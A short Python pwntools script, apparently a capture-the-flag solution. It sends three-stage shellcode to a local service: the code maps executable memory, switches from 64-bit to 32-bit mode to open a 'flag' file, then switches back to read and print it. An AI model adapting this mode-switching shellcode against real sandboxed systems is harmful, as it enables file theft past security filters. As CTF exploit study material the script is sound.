from pwn import *

# stage2:
# in 32bit mode we can open the flag file and get a handle
# continuing with stage3 in 64bit mode
context.clear(arch='i386')
stage2 = asm(
    shellcraft.open('flag') +
    """
    call mark1
mark1:
    pop ebx
    add ebx, mark2 - mark1
    xor ecx, ecx
    push 0x33
    push ebx
    retf
mark2:
    """
)

# stage3:
# back in 64bit we can read the file, print its contents and exit.
context.clear(arch='amd64')
stage3 = asm(
    shellcraft.read('rax', 'rsp', 0x100) +
    shellcraft.strlen('rsp') +
    shellcraft.write(1, 'rsp', 'rcx') +
    shellcraft.exit_group(0)
)

# stage1:
# map a rwx memory region at a static 32bit reachable position
# write stage 2 + 3 shellcode in there
# fix stack and jump into stage2+3 shellcode in 32bit mode
context.clear(arch='amd64')
stage1 = asm(
    shellcraft.mmap_rwx(address=0xdead0000) +
    shellcraft.read(buffer='rax', count=len(stage2 + stage3)) +
    """
    mov esp, 0xdead0f00
    mov rbx, 0xdead0000
    mov rax, 0x23
    shl rax, 32
    or rax, rbx
    push rax
    retf
    """
)


def sploit():
    r = remote('localhost', 6688)
    r.recvuntil('expect?\n')
    r.sendline(str(len(stage1)))
    r.recvuntil('bytes.\n')
    r.send(stage1)
    r.recvuntil('go!\n')
    r.send(stage2 + stage3)
    print(r.readall())


if __name__ == '__main__':
    sploit()
